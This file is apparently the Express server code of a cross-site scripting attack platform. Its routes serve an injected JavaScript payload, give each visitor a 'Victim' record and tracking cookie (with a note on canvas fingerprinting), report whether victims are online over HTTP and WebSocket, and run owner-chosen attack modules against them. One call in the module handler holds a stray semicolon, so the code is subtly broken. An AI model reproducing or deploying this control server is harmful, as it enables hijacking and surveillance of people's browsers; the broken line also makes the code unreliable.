//  ALL     /
exports.xss = function(req, res){
    res.header('Content-Type', 'application/javascript');
    return res.render('love', {
        protocol:'',
        host:req.header('host'),
        id:req.query.i
    });
};
//  ALL     /i/
exports.load = function(req, res){
    //  XXX who id use "Canvas Fingerprinting"
    var id = req.param('i');
    var who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info){
            return res.jsonp(info.load);
        };
        sql.Item.findById(id, function(err, info){
            if(!info){
                return res.jsonp({
                    error:'Not found.'
                });
            };
            who = getmd5(info.owner+id+Date.now());
            res.cookie('who', who);
            sql.Victim.create({
                owner:info.owner,
                who:who,
                name:info.name+Date.now(),
                payload:info.payload,
                modules:info.modules,
                status:{},
                now:Date.now()
            }, function(){
                return res.jsonp(info.load);
            });
        });
    });
};

function online(who, on){
    sql.Victim.findOne({who:who}, function(err, info){
        info&&sql.Victim.update({who:who}, {
            now:on
        });
    });
};
function handle(req, res, modules, owner, victim, who, type){
    var share = {};
    var path = fs.realpathSync('.');
    for(var i in modules){
        var m = require(path+'/modules/'+modules[i][0]+'/'+modules[i][0]).main;
        if(typeof share[modules[i][0]] != 'object'){
            share[modules[i][0]] = [];
        };
        share[modules[i][0]].unshift(
            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:owner, t:type});
        );
    };
};

//  ALL     /h/:uri
//  ALL     /home/page/:uri
exports.http = function(req, res){
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info){return err404(req, res)};
        var owner = req.session.user&&(req.session.user.name == info.owner);
        !owner&&online(who, Date.now());
        handle(req, res, info.modules, owner, sql.Victim, who, 'http');
    });
};
//  ALL     /h/:uri
//  ALL     /home/page/:uri
exports.ws = function(ws, req){
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info){return null};
        var owner = req.session.user&&(req.session.user.name == info.owner);
        ws.on('open', function(){
            return !owner&&online(who, 'online');
        });
        ws.on('close', function(){
            return !owner&&online(who, Date.now());
        });
        ws.on('message', function(msg){
            handle(req, ws, info.modules, owner, sql.Victim, who, 'ws');
        });
    });
};
